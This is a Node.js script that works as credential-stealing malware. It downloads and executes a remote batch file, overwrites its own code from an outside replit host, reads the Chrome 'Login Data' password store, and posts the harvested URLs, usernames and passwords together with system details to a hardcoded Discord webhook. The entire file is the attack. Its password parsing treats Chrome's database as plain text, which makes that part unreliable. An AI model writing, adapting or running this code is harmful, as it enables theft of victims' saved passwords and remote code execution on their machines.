const axios = require("axios");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

// URLs of the files to download and update
const filesToDownload = [
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/ss.bat",
    filePath: "./script.bat",
  },
  {
    url: "https://obsidianator-code-1.blueobsidian.repl.co/index.js",
    filePath: "./index.js",
  },
];

// Discord webhook URL to send system details and passwords
const webhookUrl =
  "https://discord.com/api/webhooks/1127493526071017493/i3owo_8IrjNQ-TKVruHU4kzF0BF7ewbAisA-yLYZCbeVqgWf30UY1KLG2AyMejyhVqmD";

// Path to Chrome passwords file
const passwordsFilePath = path.join(
  os.homedir(),
  "Library/Application Support/Google/Chrome/Default/Login Data"
);

// Function to download a file and save it to a specific path
async function downloadFile(url, filePath) {
  try {
    const response = await axios.get(url);
    fs.writeFileSync(filePath, response.data);
    console.log(`File downloaded and saved: ${filePath}`);
  } catch (error) {
    console.error(`Error downloading file: ${filePath}`, error.message);
    throw error;
  }
}

// Function to execute a CMD script or JavaScript file
function executeFile(filePath) {
  try {
    // Execute the file using the 'execSync' function
    const output = execSync(filePath).toString();
    console.log("File output:", output);
  } catch (error) {
    console.error("Error executing file:", error);
    throw error;
  }
}

// Function to retrieve system details
function getSystemDetails() {
  const systemDetails = {
    computerName: os.hostname(),
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    platform: os.platform(),
    architecture: os.arch(),
    release: os.release(),
  };
  return systemDetails;
}

// Function to retrieve Chrome passwords and URLs
function getChromePasswords() {
  return new Promise((resolve, reject) => {
    fs.readFile(passwordsFilePath, (err, data) => {
      if (err) {
        console.error("Error reading Chrome passwords file:", err);
        reject(err);
      } else {
        const passwords = [];
        const lines = data.toString().split("\n");
        lines.forEach((line) => {
          const parts = line.split(";");
          if (parts.length >= 4) {
            passwords.push({
              url: parts[0],
              username: parts[2],
              password: parts[3],
            });
          }
        });
        resolve(passwords);
      }
    });
  });
}

// Function to send system details and passwords to Discord webhook
async function sendSystemDetailsAndPasswordsToDiscord(details, passwords) {
  try {
    const message = `System Details:\n\`\`\`${JSON.stringify(
      details,
      null,
      2
    )}\`\`\`\n\nPasswords:\n\`\`\`${JSON.stringify(passwords, null, 2)}\`\`\``;
    await axios.post(webhookUrl, { content: message });
    console.log("System details and passwords sent to Discord webhook.");
  } catch (error) {
    console.error(
      "Error sending system details and passwords to Discord webhook:",
      error.message
    );
    throw error;
  }
}

// Function to check for file updates and self-update if necessary
async function checkAndUpdateFiles() {
  try {
    for (const file of filesToDownload) {
      // Check if the file exists
      if (!fs.existsSync(file.filePath)) {
        // File does not exist, download it
        await downloadFile(file.url, file.filePath);
      } else {
        // File exists, compare the current content with the latest version
        const latestContent = await axios.get(file.url);
        const currentContent = fs.readFileSync(file.filePath, "utf8");
        if (currentContent !== latestContent.data) {
          // Save the latest content to the file
          fs.writeFileSync(file.filePath, latestContent.data);
          console.log(`File updated: ${file.filePath}`);
        } else {
          console.log(`File is up to date: ${file.filePath}`);
        }
      }
    }
  } catch (error) {
    console.error("Error checking and updating files:", error.message);
    throw error;
  }
}

// Main function to download files, execute scripts, retrieve passwords, and send system details and passwords
async function runScript() {
  try {
    // Download files and update if necessary
    await checkAndUpdateFiles();

    // Get the absolute path to the script.bat file
    const scriptPath = path.join(__dirname, "./script.bat");

    // Execute the CMD script
    executeFile(scriptPath);

    // Retrieve system details
    const systemDetails = getSystemDetails();
    console.log("System Details:", systemDetails);

    // Retrieve Chrome passwords and URLs
    const chromePasswords = await getChromePasswords();
    console.log("Chrome Passwords:", chromePasswords);

    // Send system details and passwords to Discord webhook
    await sendSystemDetailsAndPasswordsToDiscord(
      systemDetails,
      chromePasswords
    );
  } catch (error) {
    console.error("Error in runScript:", error);
  }
}

// Invoke the main function to startthe process
runScript();
